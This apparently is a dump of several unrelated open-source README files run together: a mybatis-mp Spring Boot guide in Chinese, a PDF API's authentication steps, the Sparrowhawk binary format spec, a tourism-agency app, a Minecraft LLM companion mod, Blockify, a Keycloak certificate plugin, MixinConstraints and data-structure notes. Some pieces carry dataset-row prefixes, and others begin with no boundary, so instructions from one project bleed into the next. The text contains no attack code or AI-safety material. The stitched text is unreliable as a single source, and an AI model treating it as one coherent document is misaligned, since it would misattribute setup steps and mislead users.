提示：在开发阶段，基本不需要这样做。到了测试环境，生产环境，那再来看这个指南。不过随着项目迭代，此指南是不断更新的。

# springboot接入示例：

https://gitee.com/mybatis-mp/mybatis-mp-spring-boot-demo

# 快速开始

## 1. 基于spring-boot开发 (已引入spring、springboot 基本依赖，创建SpringApplication.run即可启动)

### 1.1 springboot2 maven 集成

```xml
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>cn.mybatis-mp</groupId>
            <artifactId>mybatis-mp-spring-boot-parent</artifactId>
            <version>1.7.3</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
```

```xml
<dependencies>
    <dependency>
        <groupId>cn.mybatis-mp</groupId>
        <artifactId>mybatis-mp-spring-boot-starter</artifactId>
    </dependency>
</dependencies>
```

### 1.2 springboot3 maven 集成

```xml
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>cn.mybatis-mp</groupId>
            <artifactId>mybatis-mp-spring-boot-parent</artifactId>
            <version>1.7.3-spring-boot3</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
```

```xml
<dependencies>
    <dependency>
        <groupId>cn.mybatis-mp</groupId>
        <artifactId>mybatis-mp-spring-boot-starter</artifactId>
    </dependency>
</dependencies>
```

#### 1.3 数据源 配置

配置spring boot配置文件

```yaml
spring.datasource.url=jdbc:mysql://localhost/test
spring.datasource.username=dbuser
spring.datasource.password=dbpass
```

或者 自己实例一个 DataSource 也可以

```java

@Configuration(proxyBeanMethods = false)
public class DatasourceConfig {

    @Bean
    public DataSource getDataSource() {
        return new EmbeddedDatabaseBuilder()
                .setName(""test_db"")
                .setType(EmbeddedDatabaseType.H2)
                .addScript(""schema.sql"")
                .build();
    }
}

```

## 开始使用

```
List<SysUser> list = QueryChain.of(sysUserMapper)
    // forSearch包含忽略null 、空字符串、对字符串进行trim去空格    
    .forSearch()
    .eq(SysUser::getId,1)
    .like(SysUser::getUserName,"" admin "")
    .list();
```

## Instructions for Running Code Demo

### Authentication

You can get **accessToken** and related verification information by sending your **publicKey** and  **SecretKey** . AccessToken will expire after **12** hours. **When calling the subsequent interface, you must carry this token in the request header**: `Authorization: Bearer {accessToken}`.

Before running each sample program, look for a comment that reads:

> `public_key_******`
>
> ` secret_key_******`

and replace `******` with your API Keys.

### Create task

A task ID is automatically generated for you based on the type of PDF tool you choose. You can provide the callback notification URL. After the task processing is completed, we will notify you of the task result through the callback interface. You can perform other operations according to the task result, such as downloading the result file.

### Upload files

Upload the original file and bind the file to the task ID. The field **parameter** is used to pass the JSON string to set the processing parameters for the file. Each file will generate automatically a unique **filekey**. 

Please note that a maximum of five files can be uploaded for a task ID and no files can be uploaded for that task after it has started.

### Execute task and get task information

After the file is uploaded, the file processing starts and the download link of the corresponding result file is obtained according to the **filekey** of each file

smithy-lang/smithy-sparrowhawk-java,main,"# Sparrowhawk Format

The Sparrowhawk format is named after the [American kestrel](https://en.wikipedia.org/wiki/American_kestrel). It's the smallest bird in its family, but can still achieve speeds of over 100 MPH in dives while hunting. Our format aims for similar goals: we want something small and fast. By leaning in to Smithy model semantics, we can offer a payload that is both compact and fast to encode and decode.

Sparrowhawk aims to achieve these goals, ranked by priority:

1. **Safe and easy schema evolution**: Schemas that describe Sparrowhawk payloads must be able to reliably change over time. In particular, clients must be able to handle receiving payloads with fields they don’t know about and servers must be able to decode payloads sent by all released clients, including releases that were rolled back. sparrowhawk will use Smithy as its modeling language, so we must be able to support [Smithy’s rules for backwards compatibility](https://smithy.io/2.0/guides/evolving-models.html).
2. **Performance**: At minimum, it must be faster than comparable serialization formats.
3. **Streaming serialized objects**: All messages in the Sparrowhawk format are length-prefixed to allow for simple and unambiguous parceling of streams of data into individual messages. sparrowhawk does not depend on its transport mechanism for providing payload boundaries so it is not subject to their limitations and can easily be migrated to new wire transports.
4. **Payload compactness**: Sparrowhawk is 50% more compact than the CBOR format used for RPCv2 CBOR and 70% more compact than JSON for the same payloads. It also realizes a 5-10% size reduction over other integer-keyed serialization formats.
5. **Model-less payload reflection and unknown field propagation**: Sparrowhawk payloads may be losslessly explored with partial or no knowledge of the schemas that define them, allowing for a limited form of model-oblivious parsing. Payloads may be partially decoded, modified, and forwarded without loss of data, allowing for proxy services to read, update, and forward requests and responses without needing full deployments alongside every model change.

## Data types

### Varints

Sparrowhawk varints are:

1. **unsigned**: it is the responsibility of the application to confer signed semantics to varints when reading or writing application data in a payload. All varints written as part of the format itself are unsigned.
2. **little-endian**: this allows for more performant decoding routines on modern processors which are overwhelmingly little-endian
3. **prefix-encoded**: the number of leading zeros in the first byte of a varint describes how many additional bytes must be read to fully decode the varint. This can be more efficiently parsed than the more common LEB128 encoding, which uses one bit per each byte to indicate if another byte follows and therefore requires one branch per byte.

Here are some sample varints:

|Value	|Hex	|First byte	|
|---	|---	|---	|
|0	|01	|00000001	|
|1	|03	|00000011	|
|127	|ff	|11111111	|
|128	|02 02	|00000010	|
|16383	|fe ff	|11111110	|
|16384	|04 00 02	|00000100	|
|2097151	|fc ff ff	|11111100	|
|2097152	|08 00 00 02	|00001000	|
|Long.MIN_VALUE	|00 ff ff ff ff ff ff ff 7f	|00000000	|
|Long.MAX_VALUE	|00 00 00 00 00 00 00 00 80	|00000000	|

The number of bytes used to encode a varint is described by adding 1 to the number of trailing least significant zero bits in the low byte. In the table above, values less than 128 all begin with 1, indicating the varint is encoded in a single byte. 128 begins with 10, meaning a two-byte encoding.

**Encoding a varint**

This demonstrates how a big-endian integer may be encoded into a little-endian varint. A big-endian “machine” representation is used because it’s easier to read; this would almost certainly be a little-endian encoding in reality.

```
 byte 0   byte 1   byte 2   byte 3
// int 8675309 in big-endian form
00000000 10000100 01011111 11101101
// Determine the number of bits used to represent this number by counting
// leading zeros and subtracting from 32. There are eight consecutive
// zeros in the high bits, so this is a 24-bit number. Varints can encode
// seven bits per byte, so we need four bytes.
// The value ""1000"" is pushed on to the low bits, shifting everything else to
// the left by 4.
00001000 01000101 11111110 11011000
// Rewrite little-endian
11011000 11111110 01000101 00001000
```

**Decoding a varint**

This demonstrates how a little-endian varint may be decoded into a big-endian integer. Like before, big-endian is used to make the example easier to read.

```
 byte 0   byte 1   byte 2   byte 3
11011000 11111110 01000101 00001000 // 8675309, encoded
00001000 01000101 11111110 11011000 // rewrite big-endian
00000000 10000100 01011111 11101101 // shift right 4 to remove low byte length bits
```

### Lists

Lists are composed of a list length and list values. A list length value is a varint describing the number of elements in the following list. The value contains type information in the low bits which describes how to decode the elements:

|Element type	|Bit pattern	|Meaning	|
|---	|---	|---	|
|Bytes	|0b0	|(n >> 1) bytes follow	|
|Lists	|0b001	|(n >> 3) lists follow	|
|Varints	|0b011	|(n >> 3) varints follow	|
|Four-byte items	|0b101	|(n >> 3) four-byte values follow	|
|Eight-byte items	|0b111	|(n >> 3) eight-byte values follow	|

When the low bit is 0, the value of the varint shifted right by one is the number of bytes that follow the varint. In all other cases, the value shifted right by three is the number of elements of the given type that follow the varint.

When the list type is varint, four-byte, or eight-byte, items are decoded in the obvious way. If a list has five varints, you can read five varints from it. Lists that contain lists are recursively decoded: the first element of a nested list has its own list type and is decoded according to the table above. Because structures and strings are both encoded as byte lists, a list of either item type is encoded as a nested list. The top-level list contains lists of byte lists, and each byte list is an encoded item.

A nested list of lists **MAY** contain heterogeneous list types. For example, the first list in a list of lists may be a byte list and the second list may be a varint list. Applications **MAY** choose to enforce that all sub-lists have the same type.

**Design note on list lengths**
A variable bit pattern was chosen to maximize the number of bytes that can be described by a one-byte varint. A single-byte varint can contain seven bits of data. Since byte lists are used to encode structures, strings, and blobs, they are the most common form of list lengths used. A two-bit type pattern would only leave five remaining bits in our one-byte varint, or a cap of 32 bytes. Only using the low bit doubles the limit to 64 bytes, which is enough to encode most strings with single-byte length prefixes.

Originally, the list length was conceived as just a varint that describes the number of bytes that follow it. After moving to the type-tag system, the loss of three bits to describe the four remaining types was deemed acceptable as each type serves as a multiplier on the element count given in the varint, and describing an element count is both more useful (for pre-sizing lists and eagerly validating list sizes) and more compact (none of the three-bit types can be encoded in one byte).

### Structures

A Sparrowhawk structure is a list of bytes (list type `0`). Following its list length value is are type sections and the data they describe. An empty structure may have zero type sections, in which case its length is zero. This is the canonical encoding of an empty structure.

Each type section opens with a varint. The low two bits of the varint describe the type of data contained in this type section:

|Type	|Bit pattern	|
|---	|---	|
|Lists	|0b00	|
|Varints	|0b01	|
|Four-byte items	|0b10	|
|Eight-byte items	|0b11	|

The third bit is a continuation bit. When set, a varint follows that describes the offset of this type section. An offset is an unsigned integer that designates the (n+1)th bitset, or the (n+1)th grouping of 61 fields of this data type. The varint shifted right by three bits is a 61-bit bitset describing the fields present in this type section. **NOTE**: a continuation field set with offset 0 describes fields 62-123, not fields 0-61. The type section describing the first 61 fields **MUST** not have the continuation bit set.

Illustrated:

```
+----------+-+--+
|  bitset  |c|tt|
+----------+-+--+
63   ...   3 2  0
```

The low two bits are the type, the third bit is the continuation flag, and the remainder is the field presence bitset. Each 1 in the bitset indicates a field that is present and a 0 indicates an absent field.

A Sparrowhawk structure is composed of fields that are uniquely identified by its type and an index number. The lowest bit in the bitset represents field 0, the next bit field 1, and so on. Index numbers are not shared between types: a varint with index 0 is distinct from a list with index 0 because they have separate types and therefore separate field presence bitsets.

Following a fieldset are the fields it indicates are present. Fields are written in order from smallest to largest index.

Field sets can be encoded in any order relative to each other. Continuation field sets can be in the front of an object and types can be written in any order.

All type sections in a serialized structure **MUST** be unique. It is an error to provide two type sections that could both encode the presence of a single field even if only one or neither actually does.

## Payload structure

A Sparrowhawk payload always begins with a list length. The list will generally be an encoded structure, but Sparrowhawk permits any type of top-level list. For example, a payload that is just a list of varints (list type 011) is valid Sparrowhawk.

deerborg/Tourism-Agency-Management,main,"## Tourism Agency Project

<img src = ""assets/banner.png"" />

This project is a hotel management system developed to digitize the daily operations of Patika Tourism Agency and optimize customer reservation processes.



## Opening the Project

1. Open the main folder where the `src` directory is located to start the project.

2. You cannot start the project without opening the main folder because the file path will not be found.

3. It is necessary to open the folder where the project is located completely.

4. **Important Note:** If you open the entire folder, you need to correct the path `""src/Log/DBconfigure.properties""` in the `Database.java` file. The correct path should be `Tourism-Agency-Management/Tourism-Agency-Management/src/Log/DBconfigure.properties`.

## Requirements

- Java 22 or higher version.
- [PostgreSQL JDBC driver](https://jdbc.postgresql.org/download.html) (e.g., postgresql-42.7.3.jar)

## Adding the Library

1. Add the downloaded PostgreSQL JDBC driver (e.g., `postgresql-42.7.3.jar`) file to your project's directory structure.

2. After opening your project, add this library to your project in your IDE or the tool you use for compilation. This step ensures that the JDBC driver can be used when compiling the project.


##
---
    Requires Java 22.0.0 to be controlled

## Features

- There are two types of users: admin and agency staff.
- User management: Admin can add, delete, update users and assign roles.

# Project description

---

**The footages for the bot conversation and config manager here in the github page is a bit outated. Check the modrinth page and download the mod to stay updated.** 
  
A minecraft mod which aims to add a ""second player"" into the game which will actually be intelligent.

**Ever felt lonely while playing minecraft alone during that two-week phase? Well, this mod aims to solve that problem of loneliness, not just catering to this particular use case, but even (hopefully in the future) to play in multiplayer servers as well.**

**Please note that this is not some sort of a commercialised AI product. This project is just a solution to a problem many Minecraft players have faced and do continue to face.**

I had to add that statement up there to prevent misunderstandings.

This mod relies on the internal code of the Carpet mod, please star the repository of the mod: https://github.com/gnembon/fabric-carpet (Giving credit where it's due)

This mod also relies on the ollama4j project. https://github.com/amithkoujalgi/ollama4j

---

# Upcoming features

- Fully implemented pathfinding for the bot.
- Collision and entity detection(detects entites around it and looks at it).
- Interaction with the world environment in general.

# Progress: 60%

## For the nerds

Sucessfully implemented the intellgence update.

So, for the tech savvy people, I have implemented the following features.

**LONG TERM MEMORY**: This mod now features concepts used in the field AI like Natural Language Processing (much better now) and something called

**Retrieval Augmented Generation (RAG)**.

How does it work?

Well:

![Retrieval Augmented Generation process outline](https://cdn.modrinth.com/data/cached_images/f4f51461946d8fb02be131d6ea53db238cdbd8c4.png)

![Vectors](https://media.geeksforgeeks.org/wp-content/uploads/20200911171455/UntitledDiagram2.png)


We convert the user input, to a set of vector embeddings which is a list of numbers.

Then **physics 101!**

A vector is a representation of 3 coordinates in the XYZ plane. It has two parts, a direction and a magnitude.

If you have two vectors, you can check their similarity by checking the angle between them.

The closer the vectors are to each other, the more **similar** they are!

Now if you have two sentences, converted to vectors, you can find out whether they are similar to each other using this process.

In this particular instance I have used a method called **cosine similarity**

[Cosine similarity](https://www.geeksforgeeks.org/cosine-similarity/)

Where you find the similarity using the formula

`(x, y) = x . y / |x| . |y|`

where |x| and |y| are the magnitudes of the vectors.


So we use this technique to fetch a bunch of stored conversation and event data from an SQL database, generate their vector embeddings, and then run that against the user's prompt. We get then further sort on the basis on let's say timestamps and we get the most relevant conversation for what the player said.


Pair this with **function calling**. Which combines Natural Language processing to understand what the player wants the bot to do, then call a pre-coded method, for example movement and block check, to get the bot to do the task.

Save this data, i.e what the bot did just now to the database and you get even more improved memory!

To top it all off, Gemma 2 8b is the best performing model for this mod right now, so I will suggest y'all to use gemma2.

In fact some of the methods won't even run without gemma2 like the RAG for example so it's a must.

https://github.com/user-attachments/assets/687b72a2-a4a8-4ab7-8b77-7373d414bb28

**Implemented Natural Language Processing for the bot to understand the intention and context of the user input and execute methods**
Can only understand if you want the bot to go some coordinates.

# Usage

## If you want to manually build and test this project, follow from step 1.

## For playing the game, download the jar file either from modrinth or the releases section and go directly to step 6.

**For users who have used the mod before, transitioning to version 1.0.2-hotfix-3**

```
1. Go to your game folder (.minecraft)/config and you will find a settings.json5 file.
Delete that

2.(If you have run the previous 1.0.2 version already then) again go back to your .minecraft. you will find a folder called ""sqlite_databases"". Inside that is a file called memory_agent.db

3. Delete that as well.
4. Install the models, mistral, llama2 and nomic-embed-text

5.Then run the game
6. Inside the game run /configMan to set the language model to llama2.

Then spawn the bot and start talking!
```

---
# Buidling the project from intellij

Step 1. Download Java 21. 

This project is built on java 21 to support carpet mod's updated API.

Go to: https://bell-sw.com/pages/downloads/#jdk-21-lts

Click on Download MSI and finish the installation process. [Windows]

![image](https://github.com/user-attachments/assets/8cf3cbe1-91a9-4d7e-9510-84723d928025)

**For linux users, depending on your system install openjdk-21-jdk package.**


Step 2. Download IntelliJ idea community edition.

https://www.jetbrains.com/idea/download/?section=windows

![Screenshot 2024-07-21 123239](https://github.com/user-attachments/assets/75d636cb-99f8-4966-8a18-f9ae22ce46bc)

Step 3. Download the project. 

If you have git setup in your machine already you can just clone the project to your machine and then open it in intellij

Or alternatively download it as a zip file, extract it and then open it in intellij

![image](https://github.com/user-attachments/assets/4384fa90-2fe9-4685-a793-8238f2789532)

Step 4. Configure the project SDK.

![image](https://github.com/user-attachments/assets/ee5a1be5-7fa4-4d42-bfdd-291a74666267)

Click on the settings gear.

![image](https://github.com/user-attachments/assets/ef74de58-6e97-428a-9e76-c5c19423963b)

Go to Project Structure

![image](https://github.com/user-attachments/assets/8979a760-3a96-49a6-8a42-c8dcd4c2e0ee)

Configure the SDK here, set it to liberica 21


Step 5. Once done wait for intellij to build the project sources, this will take a while as it basically downloads minecraft to run in a test version.

If you happen to see some errors, go to the right sidebar, click on the elephant icon (gradle)

![image](https://github.com/user-attachments/assets/7916d2bf-1381-4f9e-9df6-1e43a7bfed55)

And click on the refresh button, besides the plus icon.
Additionally you can go to the terminal icon on the bottom left

![image](https://github.com/user-attachments/assets/f95f54ab-847a-42de-b3d8-4401f03ac83a)

And type `./graldew build`


Step 6. Setup ollama.

Go to https://ollama.com/

![image](https://github.com/user-attachments/assets/c28798e4-c7bf-4faf-88e5-76315f88f0d1)

Download based on your operating system.

After installation, run ollama from your desktop. This will launch the ollama server. 

This can be accessed in your system tray

![image](https://github.com/user-attachments/assets/3ed6468e-0e8c-4723-ac80-1ab77a7208d4)


Now open a command line client, on windows, search CMD or terminal and then open it.

Depending on your specs, you can download a language model and then configure in the project to use it.

For now, in the terminal, type ![image](https://github.com/user-attachments/assets/7ecf3eea-2a7c-481b-a914-53678081e60e)

~~In this example we are going with the phi3 model.~~

For the updated version 1.0.2, you will need to download the `llama2` model: `ollama pull llama2` 
And another model `nomic-embed-text`: `ollama pull nomic-embed-text`

Without llama2, intelligence will be very low
Without nomic-embed-text, the mod will crash.


I do intend to add an option in the mod to change and configure models within the game GUI.

Once done. Go to the next step.

Step 7. Go to the files section

![image](https://github.com/user-attachments/assets/443b12ad-cb8c-4049-8fa3-01875023c42a)

Click on the ollamaClient 

Go to line 199.

[recording1](https://github.com/user-attachments/assets/bd01e7a7-ef5f-4379-9157-965c97b85ce3)

Remove the current model type, then follow the video and set it to `OllamaModelType.PHI3`

Although intelliJ autosaves but press `CTRL+S` to save.

Step 8. Finally click on the gradle icon again in the right sidebar.

![image](https://github.com/user-attachments/assets/64b085c2-1624-4cfc-9b64-22fd293f1cfe)

Fine the runClient task, and double click it to run minecraft with the mod.

# Mod usage

This section is to describe the usage of the mod in-game

## Commands

**Main command**

`/bot`

Sub commands: 

`spawm <bot>` This command is used to spawn a bot with the desired name. ==For testing purposes, please keep the bot name to Steve==.

`walk <bot> <till>` This command will make the bot walk forward for a specific amount of seconds.

`go_to <bot> <x> <y> <z>` This command is supposed to make the bot go to the specified co-ordinates, by finding the shortest path to it. It is still a work in progress as of the moment.

`send_message_to <bot> <message>` This command will help you to talk to the bot.

`teleport_forward <bot>` This command will teleport the bot forward by 1 positive block

`test_chat_message <bot>` A test command to make sure that the bot can send messages.

`detect_entities <bot> A command which is supposed to detect entities around the bot`

**Example Usage:**

`/bot spawn Steve`

The above command changes credits go to [Mr. Álvaro Carvalho](https://github.com/A11v1r15)

And yes since this mod relies on carpet mod, you can spawn a bot using carpet mod's commands too and try the mod. But if you happen to be playing in offline mode, then I recommend using the mod's in built spawn command.

# About
Ever wondered how servers like FadeCloud or AkumaMC do private farms and mines?
Well, let Blockify take care of it for you! Blockify is a public library that can manage and create client-sided blocks.

Check out the [Wiki](https://github.com/Kooperlol/Blockify/wiki) to get started, and join the [Discord](https://discord.gg/BKrSKqaAZp) for help.

## Features
1. **Stage Management**: Blockify has different stages for an audience. Each stage has multiple ""views"", which represent different patterns within a stage.
2. **Block Interaction Events**: The project handles block interaction events, such as starting to dig a block, as seen in the `BlockDigAdapter` class.
3. **Block Breaking Events**: Blockify also handles block-breaking events, including checking if a block is breakable and sending block change updates to the player.
4. **Chunk Loading**: The `ChunkLoadAdapter` class handles chunk-loading events, including sending block changes to the player.
5. **Game Mode Checks**: The project checks the player's game mode and adjusts block-breaking speed accordingly.
6. **Memory Management**: Blockify manages memory efficiently by using custom data types like `BlockifyPosition` and `BlockifyChunk`.
7. **Skript Support**: Blockify has a Skript Addon, [SkBlockify](https://github.com/Kooperlol/SkBlockify), that allows you to use Skript to manage client-sided blocks.
8. **Custom Events:** Blockify has a custom event `BlockifyBlockBreakEvent` that is called when a block is broken. 
9. **Complex Block Patterns:** Blockify can handle complex block patterns using the `BlockifyPattern` class. In addition, it can handle setting crop ages and other custom block data.
10. **Custom Mining Speeds:** Blockify allows for custom mining speeds which you can set for a player in an audience.

core247/keycloak-eds-plugin,main,"# Keycloak EDS plugin
The Keycloak plugin for certificate-based authentication enables the use of 
X.509 certificates for user authentication.
When a user attempts to log in, the plugin prompts the user to present a certificate. 
If the user's client certificate is supported, authentication will be based on the 
information contained within that certificate.
The user certificate plugin provides security by allowing users to authenticate using 
two-factor authentication. This means the user must provide something they know (password)
and something they are in possession of (certificate).
The plugin can also be configured to perform additional checks such as checking the
Certificate Revocation List (CRL)(see revoke-api documentation part below)
In essence, the Keycloak plugin for certificate-based authentication provides 
outstanding security and flexibility for the users and administrators of your system.

It was developed and tested against **Keycloak 22.0.4**. 
Compatibility with other versions of Keycloak is not guaranteed.

## License
This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.

## Getting Help

If you find a bug or an issue, please

[report an issue](https://github.com/core247/keycloak-eds-plugin/issues/new) on the keycloak eds plugin repository

## Contributing

See the [contributing documentation](CONTRIBUTING.md)

## What does plugin provides:
- Implement secondary sign-in step in the browser flow.
- Validate and perform revocation checks on certificates.
- Verify users based on their user attributes.

## Local development
- Use `Amazon Corretto 17` as the SDK.

- For local development, put these libraries in the `libs` folder:
    - `commons-logging-1.1.1.jar`
    - `kalkancrypt-0.7.2.jar`
    - `kalkancrypt_xmldsig-0.4.jar`
    - `knca_provider_util-0.8.jar`
    - `xmlsec-1.5.8.jar`

- Build the plugin with Maven using `mvn clean package`.

- - Use docker-compose to launch Keycloak with the plugin:
```
cd docker
docker-compose up -d
```

## Configuring Keycloak for Local Testing

[KEYCLOAK-CONFIGURE.md](KEYCLOAK-CONFIGURE.md)

## Using on production

For production use, you should place the Keycloak plugin JAR file and other 
Kalkan libraries in the same location as specified in the docker-compose file:

- Place the `eds-plugin-corporate-1.0.0.jar` file in the `/opt/bitnami/keycloak/providers/eds-plugin-corporate.jar` directory. 
  The path should look like this: `../eds-plugin-corporate/target/eds-plugin-corporate-1.0.0.jar:/opt/bitnami/keycloak/providers/eds-plugin-corporate.jar`
- Place the `eds-plugin-individual-1.0.0.jar` file in the `/opt/bitnami/keycloak/providers/eds-plugin-individual.jar` directory.
  The path should look like this: `../eds-plugin-individual/target/eds-plugin-individual-1.0.0.jar:/opt/bitnami/keycloak/providers/eds-plugin-individual.jar`
- Place the contents of the `libs` directory in the `/opt/bitnami/keycloak/providers` directory. 
  The path should look like this: `../libs/:/opt/bitnami/keycloak/providers/`
- Configure user attributes in keycloak
  - For individual users to be able to use the plugin, you need to add an attribute named 
    `initials` to the user's attributes. This attribute should contain the User's Tax Code. 
     The plugin will use this specific attribute for identification purposes.
  - For corporate users, you need to add the attribute userClass representing the 
    Corporate's BIN (Tax Code). Similar to individual users, this attribute enhances the 
    plugin's capability to identify a corporate user.
- Additionally, for handling certificate revocations, you should refer to the documentation in the revoke-api section below.

### revoke-api
The `revoke-api` module is designed to facilitate setting up certificate verification 
according to your custom implementation. You can extend and tailor the functionality 
of the certificate verifier to satisfy your specific needs.

By default, the system utilizes the `kz.core247.keycloak.eds.revoke.NullCommonCertificateVerifier` implementation 
if no custom implementation is provided by the user. This default implementation consistently
returns a positive (true) result.

#### Steps
- Implement the `kz.core247.keycloak.eds.revoke.CommonCertificateVerifier` interface.
Start by creating a class that implements the CommonCertificateVerifier interface. 
Your class should have defined all methods indicated in the interface.

Refer to the `kz.core247.example.RandomCommonCertificateVerifier` in the `random-revoke-api-impl` module 
as an illustrative example of this implementation.

- Specify the Location of the JAR in Docker Setup
  If you are using Docker, you will need to add the JAR file to your Keycloak setup. Specify the location of the jar file in your docker-compose.yml file.
  ```volumes:
    - ../random-revoke-api-impl/target/random-revoke-api-impl-1.0.0.jar:/opt/bitnami/keycloak/providers/random-revoke-api-impl.jar```

- Configure system properties
  Delineate your custom class through the utilization of system properties. Particularly, apply the 'INDIVIDUAL_CERT_VERIFIER_CLASS_NAME' and 'CORPORATE_CERT_VERIFIER_CLASS_NAME' properties.
  When deploying with Docker, system properties can be set in the environment configuration. For example:
  ```
     JAVA_OPTS_APPEND: -DINDIVIDUAL_CERT_VERIFIER_CLASS_NAME=kz.core247.example.RandomCommonCertificateVerifier
  ```
  Replace `kz.core247.example.RandomCommonCertificateVerifier` with your implemented class. This allows the revoke-api module to use your custom class for certificate verification.",0,2,1,apache-2.0,0.0

Moulberry/MixinConstraints,master,"# MixinConstraints

A library to enable/disable mixins using annotations.

Annotations can be applied to mixin classes to toggle the whole mixin, or individual fields/methods for more precision.

# Installing

MixinConstraints is available through Maven Central.

__Gradle__
```groovy
dependencies {
    include(implementation(""com.moulberry:mixinconstraints:1.0.1""))
}
```

Next, you will need to bootstrap the library to affect your mixins.

The easiest way to do so is by using the provided Mixin Plugin by adding the following to your modid.mixins.json:
```json5
{
    ""plugin"": ""com.moulberry.mixinconstraints.ConstraintsMixinPlugin"",
}
```

If you already have your own mixin plugin, you can use the [ConstraintsMixinPlugin](https://github.com/Moulberry/MixinConstraints/blob/master/src/main/java/com/moulberry/mixinconstraints/ConstraintsMixinPlugin.java) class as a reference to add support.

# Using the library

The library provides 4 annotations
- @IfModLoaded (checks if a mod is loaded)
- @IfModAbsent (checks if a mod is absent)
- @IfMinecraftVersion (checks if the Minecraft version matches a range)
- @IfDevEnvironment (checks if the game is running inside a development environment)

These annotations can be applied to classes to control whether the whole mixin is applied

For example, the following mixin will only be applied if sodium or embeddium is present
```java
@IfModLoaded(value = ""sodium"", aliases = {""embeddium""})
@Mixin(BlockOcclusionCache.class)
public class MixinSodiumBlockOcclusionCache {
   ...
}
```

Additionally, the annotations can also be applied to individual fields/methods

For example, the following mixin will inject only one of the two methods depending on whether the mod is in a dev environment
```java
@Mixin(Minecraft.class)
public class MixinMinecraft {
    @IfDevEnvironment
    @Inject(at = @At(""HEAD""), method = ""run"")
    private void runDev(CallbackInfo info) {
        System.out.println(""Hello from a dev environment!"");
    }

    @IfDevEnvironment(negate = true)
    @Inject(at = @At(""HEAD""), method = ""run"")
    private void runProd(CallbackInfo info) {
        System.out.println(""Hello from production!"");
    }
}
```

Some constraints support version ranges, which can be used like so:
```java
@IfModLoaded(value = ""modernfix"", minVersion = ""5.11"", maxVersion = ""5.15"")
```
The version comparison uses Fabric API's [Version](https://github.com/FabricMC/fabric-loader/blob/master/src/main/java/net/fabricmc/loader/api/Version.java). Ensure the version resembles a semver string in order for range comparison to work as expected.

## Data Structures
### Linked List
 * A *Linked List* is a linear collection of data elements, called nodes, each
   pointing to the next node by means of a pointer. It is a data structure
   consisting of a group of nodes which together represent a sequence.
 * **Singly-linked list**: linked list in which each node points to the next node and the last node points to null
 * **Doubly-linked list**: linked list in which each node has two pointers, p and n, such that p points to the previous node and n points to the next node; the last node's n pointer points to null
 * **Circular-linked list**: linked list in which each node points to the next node and the last node points back to the first node
 * Time Complexity:
   * Access: `O(n)`
   * Search: `O(n)`
   * Insert: `O(1)`
   * Remove: `O(1)`

### Stack
 * A *Stack* is a collection of elements, with two principle operations: *push*, which adds to the collection, and
   *pop*, which removes the most recently added element
 * **Last in, first out data structure (LIFO)**: the most recently added object is the first to be removed
 * Time Complexity:
   * Access: `O(n)`
   * Search: `O(n)`
   * Insert: `O(1)`
   * Remove: `O(1)`

### Queue
 * A *Queue* is a collection of elements, supporting two principle operations: *enqueue*, which inserts an element
   into the queue, and *dequeue*, which removes an element from the queue
 * **First in, first out data structure (FIFO)**: the oldest added object is the first to be removed
 * Time Complexity:
   * Access: `O(n)`
   * Search: `O(n)`
   * Insert: `O(1)`
   * Remove: `O(1)`

### Tree
 * A *Tree* is an undirected, connected, acyclic graph

### Binary Tree
 * A *Binary Tree* is a tree data structure in which each node has at most two children, which are referred to as
   the *left child* and *right child*
 * **Full Tree**: a tree in which every node has either 0 or 2 children
 * **Perfect Binary Tree**: a binary tree in which all interior nodes have two children and all leave have the same depth
 * **Complete Tree**: a binary tree in which every level *except possibly the last* is full and all nodes in the last
   level are as far left as possible

### Binary Search Tree
 * A binary search tree, sometimes called BST, is a type of binary tree which maintains the property that the value in each
   node must be greater than or equal to any value stored in the left sub-tree, and less than or equal to any value stored
   in the right sub-tree
 * Time Complexity:
   * Access: `O(log(n))`
   * Search: `O(log(n))`
   * Insert: `O(log(n))`
   * Remove: `O(log(n))`

<img src=""/images/BST.png?raw=true"" alt=""Binary Search Tree"" width=""400"" height=""500"">

### Trie
* A trie, sometimes called a radix or prefix tree, is a kind of search tree that is used to store a dynamic set or associative
  array where the keys are usually Strings. No node in the tree stores the key associated with that node; instead, its position 
  in the tree defines the key with which it is associated. All the descendants of a node have a common prefix of the String associated 
  with that node, and the root is associated with the empty String.

![Alt text](/images/trie.png?raw=true ""Trie"")

### Fenwick Tree
* A Fenwick tree, sometimes called a binary indexed tree, is a tree in concept, but in practice is implemented as an implicit data
  structure using an array. Given an index in the array representing a vertex, the index of a vertex's parent or child is calculated
  through bitwise operations on the binary representation of its index. Each element of the array contains the pre-calculated sum of
  a range of values, and by combining that sum with additional ranges encountered during an upward traversal to the root, the prefix
  sum is calculated
* Time Complexity:
  * Range Sum: `O(log(n))`
  * Update: `O(log(n))`

![Alt text](/images/fenwickTree.png?raw=true ""Fenwick Tree"")

### Segment Tree
* A Segment tree, is a tree data structure for storing intervals, or segments. It allows querying which of the stored segments contain
  a given point
* Time Complexity:
  * Range Query: `O(log(n))`
  * Update: `O(log(n))`

![Alt text](/images/segmentTree.png?raw=true ""Segment Tree"")

### Heap
* A *Heap* is a specialized tree based structure data structure that satisfies the *heap* property: if A is a parent node of
B, then the key (the value) of node A is ordered with respect to the key of node B with the same ordering applying across the entire heap.
A heap can be classified further as either a ""max heap"" or a ""min heap"". In a max heap, the keys of parent nodes are always greater
than or equal to those of the children and the highest key is in the root node. In a min heap, the keys of parent nodes are less than
or equal to those of the children and the lowest key is in the root node
* Time Complexity:
  * Access Max / Min: `O(1)`
  * Insert: `O(log(n))`
  * Remove Max / Min: `O(log(n))`

<img src=""/images/heap.png?raw=true"" alt=""Max Heap"" width=""400"" height=""500"">


### Hashing
* *Hashing* is used to map data of an arbitrary size to data of a fixed size. The values returned by a hash
  function are called hash values, hash codes, or simply hashes. If two keys map to the same value, a collision occurs
* **Hash Map**: a *hash map* is a structure that can map keys to values. A hash map uses a hash function to compute
  an index into an array of buckets or slots, from which the desired value can be found.
* Collision Resolution
 * **Separate Chaining**: in *separate chaining*, each bucket is independent, and contains a list of entries for each index. The
 time for hash map operations is the time to find the bucket (constant time), plus the time to iterate through the list
 * **Open Addressing**: in *open addressing*, when a new entry is inserted, the buckets are examined, starting with the
 hashed-to-slot and proceeding in some sequence, until an unoccupied slot is found. The name open addressing refers to
 the fact that the location of an item is not always determined by its hash value


